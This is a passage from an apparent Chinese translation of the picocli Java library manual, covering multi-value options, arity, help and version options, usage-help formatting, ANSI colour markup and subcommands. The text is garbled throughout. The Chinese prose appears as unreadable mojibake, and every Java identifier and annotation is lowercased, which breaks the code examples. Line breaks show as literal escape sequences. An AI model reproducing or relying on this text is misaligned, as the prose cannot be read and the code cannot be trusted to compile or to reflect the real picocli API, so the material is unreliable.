file")\nlist<file> files;\n\n\n1\n2\n\n\n\n# å¤å¼\n\n\n# éå¤éé¡¹\n\nåå»ºå¤å¼éé¡¹çæç®åæ¹æ³æ¯å£°æä¸ä¸ªå¸¦æ³¨éçå­æ®µï¼å¶ç±»åæ¯æ°ç»ãéåææ å°ã\n\n@option(names = "-option")\nint[] values;\n\n\n1\n2\n\n\nä½¿ç¨å¦ä¸çå½ä»¤ï¼\n\n<command> -option 111 -option 222 -option 333\n\n\n1\n\n\næ¯ä¸ä¸ªåç´ é½ä¼è¢«æ·»å å°æ°ç»ä¸­ã\n\n\n# æ­£åæå\n\néé¡¹ååæ°è¿å¯ä»¥æå®ä¸ä¸ªæåæ­£åè¡¨è¾¾å¼ï¼ç¨äºå°æ¯ä¸ªéé¡¹åæ°æåä¸ºè¾å°çå­å­ç¬¦ä¸²ãæ¯ä¸ªå­å­ç¬¦ä¸²é½è½¬æ¢ä¸ºéåææ°ç»çç±»åãè¯·åééååå­å¸\n\n@option(names = "-option", split = ",")\nint[] values;\n\n\n1\n2\n\n\nå¯ä»¥ä½¿ç¨å¦ä¸æ¹å¼ä¼ éåæ°ï¼\n\n-option 111,222,333\n\n\n1\n\n\n\n# arity\n\nææ¶ï¼æ¨æ³å®ä¹ä¸ä¸ªéé¡¹ï¼è¯¥éé¡¹éè¦ä¸ºå½ä»¤è¡ä¸çæ¯ä¸ªéé¡¹åºç°å¤ä¸ªéé¡¹åæ°ãarityå±æ§åè®¸æ¨åç¡®æ§å¶æ¯æ¬¡éé¡¹åçè¦æ¶èå¤å°åæ°ã\n\narityå±æ§å¯ä»¥æå®æéåæ°çç¡®åæ°éï¼æå·ææå°åæå¤§åæ°æ°éçèå´ãæå¤§å¼å¯ä»¥æ¯ç²¾ç¡®çä¸éï¼ä¹å¯ä»¥æ¯â*âæ¥è¡¨ç¤ºä»»ææ°éçåæ°ãä¾å¦ï¼\n\nclass aritydemo {\n    @parameters(arity = "1..3", descriptions = "one to three files")\n    file[] files;\n\n    @option(names = "-f", arity = "2", description = "exactly two floating point numbers")\n    double[] doubles;\n\n    @option(names = "-s", arity = "1..*", description = "at least one string")\n    string[] strings;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nå½å½ä»¤è¡ä¸æå®çåæ°å°äºæå°å¼æ¶ï¼ä¼æåºmissingparameterexceptionã\n\nå¦ææ²¡ææå®arityï¼åæ°çæ°éåå³äºå­æ®µçç±»åãç¨æ·æåææ´å¤å³äºarityçè¯¦ç»ä¿¡æ¯ã\n\n\n# helpéé¡¹\n\nå½mixinstandardhelpoptionså½ä»¤å±æ§è®¾ç½®ä¸ºtrueæ¶ï¼picocliä¼å¨å½ä»¤ä¸­æ·»å mixinï¼è¯¥å½ä»¤å° usagehelpåversionhelpéé¡¹æ·»å å°å½ä»¤ä¸­ãä¾å¦ï¼\n\n@command(mixinstandardhelpoptions = true, version = "auto help demo - picocli 3.0")\nclass autohelpdemo implements runnable {\n\n    @option(names = "--option", description = "some option.")\n    string option;\n\n    @override public void run() { ... }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nä¸è¿°ç¤ºä¾çä½¿ç¨å¸®å©æ¶æ¯å¦ä¸æç¤ºï¼\n\nusage: <main class> [-hv] [--option=<option>]\n      --option=<option>   some option.\n  -h, --help              show this help message and exit.\n  -v, --version           print version information and exit\n\n\n1\n2\n3\n4\n\n\n\n# èªå®ä¹helpéé¡¹\n\nåºç¨ç¨åºå¯ä»¥éè¿è®¾ç½®å±æ§versionhelp = trueã usagehelp = trueæhelp = trueæ¥å®ä¹èªå®ä¹å¸®å©éé¡¹ãå¦æå½ä»¤è¡ä¸æå®çåæ°ä¹ä¸æ¯âå¸®å©âéé¡¹ï¼å½ç¼ºå°æå¿é¡»çéé¡¹æ¶ï¼picocliä¸ä¼æåºmissingparameterexceptionã\n\n@option(names = {"-v", "--version"}, versionhelp = true, description = "display version info")\nboolean versioninforequested;\n\n@option(names = {"?", "-h", "--help"}, usagehelp = true, description = "display this help message")\nboolean usagehelprequested;\n\n\n1\n2\n3\n4\n5\n\n\nå°è¿äºå±æ§ç¨äºè¯·æ±å¨æ§å¶å°ä¸æ¾ç¤ºä½¿ç¨å¸®å©æ¶æ¯æçæ¬ä¿¡æ¯çéé¡¹ã\n\ncommandlineç±»æä¾äºä¸¤ç§æ¹æ³ï¼åè®¸å¤é¨ç»ä»¶æ£æµæ¯å¦è¯·æ±äºä½¿ç¨å¸®å©æçæ¬ä¿¡æ¯ï¼æ éæ£æ¥å¸¦æ³¨éçåå¯¹è±¡ï¼ï¼\n\n * commandline.isusagehelprequested()å¦æè§£æå¨å¹éäºç¨ä½¿ç¨help=trueæ³¨éçéé¡¹ï¼åè¿åtrue\n * å¦æè§£æå¨å¹éå¸¦æversionhelp=trueæ³¨éçéé¡¹ï¼commandline.isversionhelprequested()è¿åtrue\n\ncommandline commandline = new commandline(new app());\ncommandline.parseargs(args);\nif (commandline.isusagehelprequested()) {\n   commandline.usage(system.out);\n   return;\n} else if (commandline.isversionhelprequested()) {\n   commandline.printversionhelp(system.out);\n   return;\n}\n// ... run app\'s business logic\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nå¦è¯·åéç¨æ·æåçâèªå¨æå°å¸®å©âä¸ç« ã\n\n\n# version help\n\n\n# éæçæ¬ä¿¡æ¯\n\nåºç¨ç¨åºå¯ä»¥å¨@commandæ³¨éççæ¬å±æ§ä¸­æå®çæ¬ä¿¡æ¯ã\n\n@command(version = "1.0")\nclass versionedcommand { ... }\n\n\n1\n2\n\n\ncommandline.printversionhelpï¼printstreamï¼æ¹æ³ä»æ­¤æ³¨éä¸­æåçæ¬ä¿¡æ¯ï¼å¹¶å°å¶æå°å°æå®çprintstreamã\n\ncommandline commandline = new commandline(new versionedcommand());\n//...\ncommandline.printversionhelp(system.out);\n\n\n1\n2\n3\n\n\nè¯¥çæ¬å¯ä»¥æå®å¤ä¸ªå­ç¬¦ä¸²ï¼å¹¶å¯è½åå«æ è®°ä»¥æ¾ç¤ºansiæ ·å¼åé¢è²ãä¾å¦ï¼\n\n@command(version = {\n        "@|yellow versioned command 1.0|@",\n        "@|blue build 12345|@",\n        "@|red,bg(white) (c) 2017|@" })\nclass versionedcommand { ... }\n\n\n1\n2\n3\n4\n5\n\n\n\n\n\n# å¨æçæ¬ä¿¡æ¯\n\n@commandæ³¨éæ¯æversionproviderå±æ§ãåºç¨ç¨åºå¯ä»¥å¨æ­¤å±æ§ä¸­æå®iversionproviderå®ç°ï¼picocliå°å®ä¾åè¯¥ç±»å¹¶è°ç¨å®æ¥æ¶éçæ¬ä¿¡æ¯ã\n\ngithubé¡¹ç®æä¸ä¸ªç¤ºä¾å®ç°ï¼å¯ä»¥ä»æ¸åæä»¶ä¸­è·åçæ¬ï¼å¦ä¸ä¸ªç¤ºä¾ä»æå»ºçæççæ¬å±æ§æä»¶ä¸­è·åçæ¬ä¿¡æ¯ã\n\n\n# usage help\n\n\n# ä½¿ç¨ä¿¡æ¯ç¤ºä¾\n\npicocliä½¿æ¨çåºç¨ç¨åºå¯ä»¥è½»æ¾çæè¿æ ·çä½¿ç¨å¸®å©æ¶æ¯ï¼\n\nusage: cat [-abeensttuv] [--help] [--version] [file...]\nconcatenate file(s), or standard input, to standard output.\n      file                 files whose contents to display\n  -a, --show-all           equivalent to -vet\n  -b, --number-nonblank    number nonempty output lines, overrides -n\n  -e                       equivalent to -vet\n  -e, --show-ends          display $ at end of each line\n  -n, --number             number all output lines\n  -s, --squeeze-blank      suppress repeated empty output lines\n  -t                       equivalent to -vt\n  -t, --show-tabs          display tab characters as ^i\n  -u                       (ignored)\n  -v, --show-nonprinting   use ^ and m- notation, except for ldf and tab\n      --help               display this help and exit\n      --version            output version information and exit\ncopyright(c) 2019\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nä½¿ç¨å¸®å©æ¶æ¯ç±æ³¨è§£å±æ§çæï¼å¦ä¸æç¤ºï¼\n\n@command(name = "cat", footer = "copyright(c) 2019",\n         description = "concatenate file(s), or standard input, to standard output.")\nclass cat {\n\n  @parameters(paramlabel = "file", description = "files whose contents to display")\n  list<file> files;\n\n  @option(names = "--help", usagehelp = true, description = "display this help and exit")\n  boolean help;\n\n  @option(names = "-t",                 description = "equivalent to -vt")  boolean t;\n  @option(names = "-e",                 description = "equivalent to -vet") boolean e;\n  @option(names = {"-a", "--show-all"}, description = "equivalent to -vet") boolean all;\n\n  // ...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# ä½¿ç¨å¸®å©æ¶æ¯åç´ \n\nä½¿ç¨å¸®å©æ¶æ¯çåç§åç´ å¾å®¹æç¨æ³¨è§£èªå®ä¹ã\n\n# å½ä»¤åç§°\n\nå¨ä¸é¢çç¤ºä¾ä¸­ï¼ç¨åºåç§°åèªå½ä»¤æ³¨éçåç§°å±æ§ï¼\n\n@command(name = "cat")\n\n\n1\n\n\næ²¡æåç§°å±æ§ï¼picocliå°å¨æ¦è¦ä¸­æ¾ç¤ºä¸ä¸ªéç¨ç<main class>ï¼\n\nusage: <main class> [-abeensttuv] [--help] [--version] [file...]\n\n\n1\n\n\n# åæ°æ ç­¾\n\néå¸å°éé¡¹éè¦ä¸ä¸ªå¼ãä½¿ç¨å¸®å©åºè¯¥è§£éè¿ä¸ç¹ï¼picocliå¨æ¦è¦åéé¡¹åè¡¨ä¸­æ¾ç¤ºéé¡¹åæ°ãé»è®¤æåµä¸ï¼å­æ®µåæ¾ç¤ºå¨<å>æ¬å·ä¸­ãä½¿ç¨paramlabelå±æ§æ¾ç¤ºä¸åçåç§°ãä¾å¦ï¼\n\nusage: <main class> [-f=file] [-n=<number>] num <host>\n      num        number param\n      host       the host\n  -f= file       a file\n  -n= <number>   number option\n\n\n1\n2\n3\n4\n5\n\n\nä»¥ä¸ç¤ºä¾ç±»ä¸­çä¸äºæ³¨éå­æ®µå·æparamlabelå±æ§ï¼èå¦ä¸äºåæ²¡æï¼\n\n@command()\nclass paramlabels {\n    @option(names = "-f",    description = "a file",       paramlabel = "file") file f;\n    @option(names = "-n",    description = "number option")                     int number;\n    @parameters(index = "0", description = "number param", paramlabel = "num")  int n;\n    @parameters(index = "1", description = "the host")                          inetaddress host;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# æåºçéé¡¹åè¡¨\n\né»è®¤æåµä¸ï¼éé¡¹åè¡¨æå­æ¯é¡ºåºæ¾ç¤ºéé¡¹ãä½¿ç¨sortoptions = falseå±æ§æç§æ¨ç±»ä¸­å£°æçé¡ºåºæ¾ç¤ºéé¡¹ã\n\n@command(sortoptions = false)\n\n\n1\n\n\n# ç¼©åç®è¿°\n\nå¦æå½ä»¤éå¸¸å¤æå¹¶ä¸æå¾å¤éé¡¹ï¼ææ¶æå¥½ä½¿ç¨ç¼©åsynopsiså±æ§æå¶æ¦è¦ä¸­çç»èãä¾å¦ï¼\n\n@command(abbreviatesynopsis = true)\nclass app { ... }\n\n\n1\n2\n\n\nè¿æ¾ç¤ºäºä¸é¢çæ¦è¦ãä½ç½®åæ°ä¸ç¼©åã\n\nusage: <main class> [options] [<files>...\n\n\n1\n\n\n# èªå®ä¹æ¦è¦\n\nä¸ºäºæ´å¥½å°æ§å¶æ¦è¦ï¼è¯·ä½¿ç¨customsynopsiså±æ§æå®ä¸ä¸ªæå¤ä¸ªæ¦è¦è¡ãä¾å¦ï¼\n\nusage: ln [option]... [-t] target link_name   (1st form)\n  or:  ln [option]... target                  (2nd form)\n  or:  ln [option]... target... directory     (3rd form)\n  or:  ln [option]... -t directory target...  (4th form)\n\n\n1\n2\n3\n4\n\n\nè¦çæä¸è¿°æ¦è¦ï¼è¯·å¨customsynopsiså±æ§ä¸­æå®æå­ææ¬ï¼\n\n@command(synopsisheading = "", customsynopsis = {\n        "usage: ln [option]... [-t] target link_name   (1st form)",\n        "  or:  ln [option]... target                  (2nd form)",\n        "  or:  ln [option]... target... directory     (3rd form)",\n        "  or:  ln [option]... -t directory target...  (4th form)",\n})\nclass ln { ... }\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# å¤´é¨ååºé¨\n\næ é¢å°æ¾ç¤ºå¨ä½¿ç¨å¸®å©æ¶æ¯çé¡¶é¨ï¼å¤§çº²ä¹åï¼ãå¦ææ¨çå½ä»¤æå­å½ä»¤ï¼ç¬¬ä¸ä¸ªæ é¢è¡ä¹æ¯å­å½ä»¤åè¡¨ä¸­æ¾ç¤ºçè¡ï¼è¯·åéå­å½ä»¤çä½¿ç¨å¸®å©ï¼ã\n\nä½¿ç¨é¡µèå±æ§æå®ä¸è¡æå¤è¡ï¼ä»¥æ¾ç¤ºå¨çæçä½¿ç¨å¸®å©æ¶æ¯ä¸æ¹ãå±æ§å­ç¬¦ä¸²æ°ç»çæ¯ä¸ªåç´ é½æ¾ç¤ºå¨åç¬çè¡ä¸ã\n\nheaderheadingåfooterheadingå¯è½åå«æ ¼å¼è¯´æç¬¦ãè¯·åéé¨åæ é¢ã\n\n# ç« èæ é¢\n\né¨åæ é¢å¯ç¨äºä½¿ä½¿ç¨æ¶æ¯å¸å±çèµ·æ¥æ´å®½æãç« èæ é¢å¯è½åå«åµå¥å¼è¡åéç¬¦ï¼%nï¼æ ¼å¼è¯´æç¬¦ï¼\n\n@command(name = "commit",\n        sortoptions = false,\n        headerheading = "usage:%n%n",\n        synopsisheading = "%n",\n        descriptionheading = "%ndescription:%n%n",\n        parameterlistheading = "%nparameters:%n",\n        optionlistheading = "%noptions:%n",\n        header = "record changes to the repository.",\n        description = "stores the current contents of the index in a new commit " +\n                "along with a log message from the user describing the changes.")\nclass gitcommit { ... }\n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nä»è¯¥ç±»çæçå¸®å©æ¶æ¯çä½¿ç¨æåµå¦ä¸æç¤ºå¨ç¨æ·æåçæ©å±ç¤ºä¾ä¸­ã\n\n# éé¡¹åæ°åç¦»å¨\n\næ¦è¦ä¸­æ¾ç¤ºçéé¡¹åéé¡¹åæ°ï¼é»è®¤ä¸º=ï¼ä¹é´çåéç¬¦åéé¡¹åè¡¨å¯ä»¥ä½¿ç¨åéç¬¦å±æ§è¿è¡éç½®ã\n\n@command(separator = ":")\t\n\n\n1\n\n\n# éèéé¡¹ååæ°\n\nå°éèå±æ§è®¾ç½®ä¸ºtrueçéé¡¹ååæ°å°ä¸ä¼æ¾ç¤ºå¨ä½¿ç¨å¸®å©æ¶æ¯ä¸­ãæå³è¯¦ç»ä¿¡æ¯ï¼è¯·åéç¨æ·æåã\n\n# æ¾ç¤ºé»è®¤å¼\n\néé¡¹æä½ç½®åæ°çé»è®¤å¼å¯ä»¥éè¿å¨æè¿°ææ¬ä¸­æå®åé${default-value}åµå¥å°æè¿°ä¸­ãæå³è¯¦ç»ä¿¡æ¯ï¼è¯·åéç¨æ·æåã\n\nåæ ·ï¼å¯ä»¥éè¿å¨æè¿°ææ¬ä¸­æå®åé${completion-candidates}ï¼å°å®æåéèåµå¥å°éé¡¹æä½ç½®åæ°çæè¿°ä¸­ãæå³è¯¦ç»ä¿¡æ¯ï¼è¯·åéç¨æ·æåã\n\n# å¿å¡«éé¡¹æ è®°\n\næééé¡¹å¯ä»¥éè¿ä½¿ç¨ requiredoptionmarker å±æ§æå®çå­ç¬¦å¨éé¡¹åè¡¨ä¸­æ è®°ãæå³è¯¦ç»ä¿¡æ¯ï¼è¯·åéç¨æ·æå\n\n# æ¾ç¤ºå®½åº¦\n\nä½¿ç¨å¸®å©æ¶æ¯çé»è®¤å®½åº¦ä¸º80ä¸ªå­ç¬¦ãç³»ç»å±æ§picocli.usage.widthå¯ç¨äºæå®èªå®ä¹å®½åº¦ãå¯ä»¥éç½®çæå°å®½åº¦ä¸º55ä¸ªå­ç¬¦ã\n\nå®½åº¦ä¹å¯ä»¥éè¿commandline::setusagehelpwidthåusagemessagespec::widthæ¹æ³ä»¥ç¼ç¨æ¹å¼è®¾ç½®ã\n\n\n# ansié¢è²åé£æ ¼\n\n\n# å½©è²ç¤ºä¾\n\nä¸é¢æ¾ç¤ºäºä¸ç¨æ·æåä¸­æ©å±ç¤ºä¾ä¸­æ¾ç¤ºçç¸åçä½¿ç¨å¸®å©æ¶æ¯ï¼å¹¶å¯ç¨äºansiè½¬ä¹ä»£ç ã\n\n\n\n\n# æ ·å¼åé¢è²çä½¿ç¨å¸®å©\n\næ¨å¯ä»¥å¨ä½¿ç¨å¸®å©æ¶æ¯çæè¿°ãé¡µçåé¡µèä¸­ä½¿ç¨é¢è²åæ ·å¼ã\n\npicocliæ¯æèªå®ä¹æ è®°ç¬¦å·ï¼ç¨äºå¨ææ¬ä¸­æ··åé¢è²åæ ·å¼ï¼éµå¾ªjansiå¼å¥ççº¦å®ï¼å¶ä¸­@|å¼å§ä¸ä¸ªæ ·å¼é¨åï¼|@ç»æå®ãç´§æ¥ç@|æ¯ä¸ä¸ªéå·åéçé¢è²åæ ·å¼åè¡¨ï¼æä»¥@|style1[,style2]...ææ¬|@ãä¾å¦ï¼\n\n@command(description = "custom @|bold,underline styles|@ and @|fg(red) colors|@.")\n\n\n1\n\n\n\n\né¢å®ä¹çæ ·å¼åé¢è²è¡¨\n\npre-defined styles   pre-defined colors\nbold                 black\nfaint                red\nunderline            green\nitalic               yellow\nblink                blue\nreverse              magenta\nreset                cyan\n                     white\n\né»è®¤æåµä¸ï¼é¢è²ä½ä¸ºåæ¯é¢è²åºç¨ãæ¨å¯ä»¥éè¿æå®bgï¼<color>ï¼æ¥è®¾ç½®èæ¯é¢è²ãä¾å¦ï¼çº¢è²èæ¯ç@|bgï¼çº¢è²ï¼ææ¬|@ãåæ ·ï¼fgï¼<color>ï¼æ¾å¼è®¾ç½®åæ¯é¢è²ã\n\nä¸é¢çç¤ºä¾å±ç¤ºäºå¦ä½ä½¿ç¨æ­¤æ è®°ä¸ºä½¿ç¨å¸®å©æ¶æ¯çæ é¢åæè¿°æ·»å é¢è²åæ ·å¼ï¼\n\n@command(name = "commit",\n        sortoptions = false,\n        headerheading = "@|bold,underline usage|@:%n%n",\n        synopsisheading = "%n",\n        descriptionheading = "%n@|bold,underline description|@:%n%n",\n        parameterlistheading = "%n@|bold,underline parameters|@:%n",\n        optionlistheading = "%n@|bold,underline options|@:%n",\n        header = "record changes to the repository.",\n        description = "stores the current contents of the index in a new commit " +\n                "along with a log message from the user describing the changes.")\nclass gitcommit { ... }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n> æ è®°æ ·å¼ä¸è½åµå¥ï¼ä¾å¦ï¼@|bold this @|underline that|@|@å°ä¸èµ·ä½ç¨ãæ¨å¯ä»¥éè¿ç»åæ ·å¼æ¥å®ç°ç¸åçç®æ ï¼ä¾å¦ï¼@|bold this|@ @|boldï¼underline that|@å°æ­£å¸¸å·¥ä½ã\n\n\n# æ´å¤é¢è²\n\nåªæå«ç§é¢å®ä¹çå½åé¢è²ï¼ä½å¤§å¤æ°ç»ç«¯æ¯æ256ç§é¢è²ç´¢å¼è°è²æ¿ãè¯·åéç¨æ·æåçâæ´å¤é¢è²âé¨åï¼ä»¥å°è¿äºé¢è²ç¨ä½åæ¯æèæ¯é¢è²ã\n\n\n\n# åºå®åç´ éè²æ¹æ¡\n\npicocliå¯¹éé¡¹ãåæ°åå½ä»¤ä½¿ç¨é»è®¤éè²æ¹æ¡ãæ²¡ææ³¨éæ¥ä¿®æ¹æ­¤éè²æ¹æ¡ï¼ä½å¯ä»¥éè¿ç¼ç¨åç³»ç»å±æ§è¿è¡æ´æ¹ãæå³è¯¦ç»ä¿¡æ¯ï¼è¯·åéç¨æ·æåçéè²æ¹æ¡é¨åã\n\n\n# æ¯æçå¹³å°\n\npicocliåªä¼å¨æ¯æçå¹³å°ä¸åå¸ansiè½¬ä¹ä»£ç ãè¿åæ¬å¤§å¤æ°unixålinuxå¹³å°ãæå³ä¸ºwindowså½ä»¤æ§å¶å°æ·»å çè²æ¯æçåç§éé¡¹ï¼è¯·åéç¨æ·æåçwindowsé¨åã\n\n\n# å¼ºå¶å¼å¯æå³é­ansi\n\næ è®ºå¹³å°å¦ä½ï¼æ¨é½å¯ä»¥å¼ºå¶picocliå§ç»ä½¿ç¨ansiä»£ç ææ°¸è¿ä¸ä½¿ç¨ansiä»£ç ï¼\n\n * å°ç³»ç»å±æ§picocli.ansiè®¾ç½®ä¸ºtrueå¼ºå¶picocliä½¿ç¨ansiä»£ç ï¼å°picocli.ansiè®¾ç½®ä¸ºfalseå¼ºå¶picocliä¸ä½¿ç¨ansiä»£ç ãå¯¹äºæ¨çå½ä»¤è¡åºç¨ç¨åºçç¨æ·æ¥è¯´ï¼è¿å¯è½æ¯ä¸ä¸ªæç¨çå·¥å·ã\n\n * æ¨å¯ä»¥éè¿å¨è°ç¨commandline.usageæ¶æå®ansi.onæansi.offï¼å³å®ä»¥ç¼ç¨æ¹å¼å¼ºå¶ç¦ç¨æå¼ºå¶å¯ç¨ansiè½¬ä¹ä»£ç ãè¿è¦çäºç³»ç»å±æ§picocli.ansiçå¼ãä¾å¦ï¼\n\nimport picocli.commandline.help.ansi;\n\napp app = commandline.usage(new app(), system.out, ansi.off, args);\n\n\n1\n2\n3\n\n\n\n# å­å½ä»¤\n\n\n# æ³¨åå­å½ä»¤\n\nå­å½ä»¤å¯ä»¥ä»¥ç¼ç¨æå£°ææ¹å¼æ³¨å\n\n# ç¼ç¨æ¹å¼\n\nå­å½ä»¤å¯ä»¥ä½¿ç¨commandline.addsubcommandæ¹æ³æ³¨åãæ¨ä¼ éå½ä»¤åå¸¦æ³¨è§£çå¯¹è±¡çåç§°ä»¥å¡«åå­å½ä»¤éé¡¹ãè§£æå¨ä½¿ç¨æå®çåç§°æ¥è¯å«å½ä»¤è¡åæ°ä¸­çå­å½ä»¤ã\n\ncommandline commandline = new commandline(new git())\n        .addsubcommand("status",   new gitstatus())\n        .addsubcommand("commit",   new gitcommit())\n        .addsubcommand("add",      new gitadd())\n        .addsubcommand("branch",   new gitbranch())\n        .addsubcommand("checkout", new gitcheckout())\n        .addsubcommand("clone",    new gitclone())\n        .addsubcommand("diff",     new gitdiff())\n        .addsubcommand("merge",    new gitmerge())\n        .addsubcommand("push",     new gitpush())\n        .addsubcommand("rebase",   new gitrebase())\n        .addsubcommand("tag",      new gittag());\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n> å³äºèªå®ä¹ç±»åè½¬æ¢å¨çæ³¨æäºé¡¹ï¼èªå®ä¹ç±»åè½¬æ¢å¨ä»æ³¨åå¨èªå®ä¹ç±»åä¹åæ·»å çå­å½ä»¤ååµå¥å­å­å½ä»¤ä¸­ãä¸ºäºç¡®ä¿ææå­å½ä»¤é½å¯ä»¥ä½¿ç¨èªå®ä¹ç±»åè½¬æ¢å¨ï¼è¯·å¨æ·»å å­å½ä»¤åæåæ³¨åç±»åè½¬æ¢å¨ã\n\n# å£°ææ¹å¼\n\nå­å½ä»¤å¯ä»¥å£°ææ§å°ä½¿ç¨@commandæ³¨éçå­å½ä»¤å±æ§æ³¨åã\n\n@command(name = "git", subcommands = {\n    gitstatus.class,\n    gitcommit.class,\n    gitadd.class,\n    gitbranch.class,\n    gitcheckout.class,\n    gitclone.class,\n    gitdiff.class,\n    gitmerge.class,\n    gitpush.class,\n    gitrebase.class,\n    gittag.class\n})\npublic class git { ... }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nå½æå»ºæ°çcommandlineï¼new git()ï¼å®ä¾æ¶ï¼å£°æçå­å½ä»¤ä¼èªå¨å®ä¾ååæ·»å ã\n\nå­å½ä»¤å±æ§ä¸­å¼ç¨çå­å½ä»¤å¿é¡»å·æå¸¦æåç§°å±æ§ç@commandæ³¨éï¼å¦åä»commandlineæé å½æ°ä¸­æåºå¼å¸¸ã\n\n# åµå¥å­å½ä»¤\n\nå­å½ä»¤å¯ä»¥åµå¥å°ä»»ææ·±åº¦çº§å«ãæå³è¯¦ç»ä¿¡æ¯ï¼è¯·åéç¨æ·æåçåµå¥å­å½ä»¤é¨åã\n\n\n# è§£æå­å½ä»¤\n\nå¯¹äºè¿ä¸ªä¾å­ï¼æä»¬åè®¾æä»¬åå»ºäºä¸ä¸ªå«ågitæ¥è°ç¨æä»¬çjavaåºç¨ç¨åºãè¿ä¹å¯ä»¥æ¯ä¸ä¸ªè°ç¨æä»¬javaç¨åºçèæ¬æå½æ°ï¼\n\nalias git=\'java picocli.demo$git\'\n\n\n1\n\n\næ¥ä¸æ¥ï¼æä»¬ç¨ä»¥ä¸åæ°è°ç¨æä»¬çå½ä»¤ï¼\n\ngit --git-dir=/home/rpopma/picocli status -sb -uno\n\n\n1\n\n\nå¶ä¸­gitï¼å®éä¸æ¯java picocli.demo$gitï¼æ¯é¡¶çº§å½ä»¤ï¼å¶æ¬¡æ¯å¨å±éé¡¹åå·æèªèº«éé¡¹çå­å½ä»¤ç¶æã\n\nè®¾ç½®è§£æå¨å¹¶è§£æå½ä»¤è¡å¯è½å¦ä¸æç¤ºï¼\n\npublic static void main(string... args) {\n    // set up the parser\n    commandline commandline = new commandline(new git());\n\n    // add subcommands programmatically (not necessary if the parent command\n    // declaratively registers the subcommands via annotation)\n    commandline.addsubcommand("status",   new gitstatus())\n               .addsubcommand("commit",   new gitcommit())\n                ...\n\n    // invoke the parse method to parse the arguments\n    list<commandline> parsed = commandline.parse(args);\n    handleparseresult(parsed);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\ncommandline.parseæ¹æ³è¿åä¸ä¸ªåå«å¯è¯å«å½ä»¤çåè¡¨ãé¡¶çº§å½ä»¤ï¼å¨æ¬ä¾ä¸­ç±gitè°ç¨çjavaç±»ï¼å§ç»æ¯è¿ååè¡¨ä¸­çç¬¬ä¸ä¸ªåç´ ã\n\nè¿åçåè¡¨è¿åå«ææå¹éçå­å½ä»¤ãæ¨çåºç¨ç¨åºéè¦æ£æ¥æ­¤åè¡¨ï¼ä»¥æ¥çè°ç¨äºåªäºå­å½ä»¤ï¼å¹¶éåéå½çè¡å¨ãä¾å¦ï¼\n\nprivate void handleparseresult(list<commandline> parsed) {\n    assert parsed.size() == 2 : "1 command and 1 subcommand found"\n\n    assert parsed.get(0).getcommand().getclass() == git.class       : "main command"\n    assert parsed.get(1).getcommand().getclass() == gitstatus.class : "subcommand"\n\n    git git = (git) parsed.get(0).getcommand();\n    assert git.gitdir.equals(new file("/home/rpopma/picocli"));\n\n    gitstatus gitstatus = (gitstatus) parsed.get(1).getcommand();\n    assert  gitstatus.shortformat              : "git status -s"\n    assert  gitstatus.branchinfo               : "git status -b"\n    assert !gitstatus.showignored              : "git status --showignored not specified"\n    assert  gitstatus.mode == gitstatusmode.no : "git status -u=no"\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nä»picocli 4.0å¼å§ï¼æ¨å¯ä»¥ä½¿ç¨æ§è¡æ¹æ³æ¥åå°åºç¨ç¨åºä¸­çéè¯¯å¤çåå¶ä»æ ·æ¿ä»£ç ã\n\n\n# @parentcommandæ³¨è§£\n\nå¨å·æå­å½ä»¤çå½ä»¤è¡åºç¨ç¨åºä¸­ï¼é¡¶çº§å½ä»¤çéé¡¹éå¸¸ç¨ä½éç¨äºææå­å½ä»¤çâå¨å±âéé¡¹ã@parentcommandæ³¨éä½¿å­å½ä»¤å¯ä»¥è½»æ¾è®¿é®å¶ç¶å½ä»¤éé¡¹ï¼ç¨@parentcommandæ³¨éçå­å½ä»¤å­æ®µéè¿å¼ç¨ç¶å½ä»¤è¿è¡åå§åãç¨æ·æåæä¸ä¸ªç¤ºä¾ï¼å±ç¤ºäºå¦ä½ä½¿ç¨@parentcommandæ³¨éã\n\n\n# å­å½ä»¤çä½¿ç¨å¸®å©\n\næ³¨åå­å½ä»¤åï¼è°ç¨commandline.usageæ¹æ³å°æ¾ç¤ºä¸æ¡ä½¿ç¨å¸®å©æ¶æ¯ï¼ææ³¨åé¡ºåºåå«ææå­å½ä»¤ãä¾å¦ï¼\n\nusage: git [-hv] [--git-dir=<gitdir>]\ngit is a fast, scalable, distributed revision control system with an unusually\nrich command set that provides both high-level operations and full access to\ninternals.\n      --git-dir=<gitdir>   set the path to the repository.\n  -h, --help               show this help message and exit.\n  -v, --version            print version information and exit.\n\ncommands:\n\nthe most commonly used git commands are:\n  help      displays help information about the specified command\n  status    show the working tree status.\n  commit    record changes to the repository.\n  add       add file contents to the index.\n  branch    list, create, or delete branches.\n  checkout  checkout a branch or paths to the working tree.\n  clone     clone a repository into a new directory.\n  diff      show changes between commits, commit and working tree, etc.\n  merge     join two or more development histories together.\n  push      update remote refs along with associated objects.\n  rebase    forward-port local commits to the updated upstream head.\n  tag       create, list, delete or verify a tag object signed with gpg.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\nåè¡¨ä¸­å­å½ä»¤çæè¿°åèªå­å½ä»¤çç¬¬ä¸ä¸ªæ é¢è¡ï¼æèï¼å¦æå­å½ä»¤æ²¡ææ é¢æ³¨éï¼ååèªæè¿°ã\n\n# éèçå­å½ä»¤\n\nå°éèå±æ§è®¾ç½®ä¸ºtrueçå½ä»¤ä¸ä¼æ¾ç¤ºå¨å¶ç¶å½ä»¤çä½¿ç¨å¸®å©æ¶æ¯ä¸­ãæå